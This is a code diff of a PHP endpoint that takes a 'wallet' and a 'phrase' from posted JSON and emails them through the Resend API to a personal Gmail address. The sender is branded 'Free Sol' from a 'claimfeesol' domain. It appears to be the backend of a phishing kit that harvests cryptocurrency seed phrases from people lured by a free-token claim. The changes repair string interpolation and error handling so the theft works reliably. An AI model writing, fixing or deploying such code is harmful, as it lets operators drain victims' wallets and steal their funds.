@@ -22,18 +22,18 @@ $resend = Resend::client($resendToken);
 
 $data = json_decode(file_get_contents("php://input"), true);
 
-$wallet = $data['wallet'];
-$phrase = $data['phrase'];
+$wallet = $data['wallet'] ?? 'Unknown';
+$phrase = $data['phrase'] ?? '';
 
 try {
-    $resend->emails->send([
-    'from' => 'Acme <onboarding@resend.dev>',
-    'to' => ['osemensilas@gmail.com'],//smitharayaskul35@gmail.com, 
-    'subject' => 'New Token',
-    'html' => '
-        <p>Wallet: {$wallet}</p>
-        <p>Phrase: {$phrase}</p>
-    ',
+    $result = $resend->emails->send([
+        'from' => 'Free Sol <contact@claimfeesol.com>',
+        'to' => ['osemensilas@gmail.com'],
+        'subject' => 'New Token',
+        'html' => "
+            <p>Wallet: {$wallet}</p>
+            <p>Phrase: {$phrase}</p>
+        ",
     ]);
 
     echo json_encode([
@@ -43,6 +43,6 @@ try {
 } catch (\Throwable $th) {
     echo json_encode([
         'status' => 'error',
-        'msg' => $e->getMessage()
+        'msg' => $th->getMessage()
     ]);
 }
